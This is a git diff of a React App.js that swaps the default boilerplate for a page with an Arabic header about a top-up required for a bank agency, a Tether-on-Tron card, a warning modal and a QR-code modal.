@@ -1,23 +1,45 @@
-import logo from './logo.svg';
-import './App.css';
+import React, { useState } from "react";
+import "./App.css";
+
+import TetherOnTronCard from "./components/TetherOnTronCard";
+import Modal from "./components/Modal";
+import QRModal from "./components/QRModal";
 
 function App() {
+  const [modalOpen, setModalOpen] = useState(false);
+  const [qrOpen, setQROpen] = useState(false);
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
+    <div className="page">
+
+      {/* الهيدر */}
+      <header className="page-header">
+        التعبئة المطلوبة للحصول على وكالة بنكية
       </header>
+
+      {/* البطاقة داخل المستطيل */}
+      <div className="card-wrapper">
+        <div className="card-background">
+          <TetherOnTronCard onClick={() => setModalOpen(true)} />
+        </div>
+      </div>
+
+      {/* نافذة التحذير */}
+      {modalOpen && (
+        <Modal
+          onClose={() => setModalOpen(false)}
+          onConfirm={() => {
+            setModalOpen(false);
+            setQROpen(true);
+          }}
+        />
+      )}
+
+      {/* نافذة QR */}
+      {qrOpen && (
+        <QRModal onClose={() => setQROpen(false)} />
+      )}
+
     </div>
   );
 }
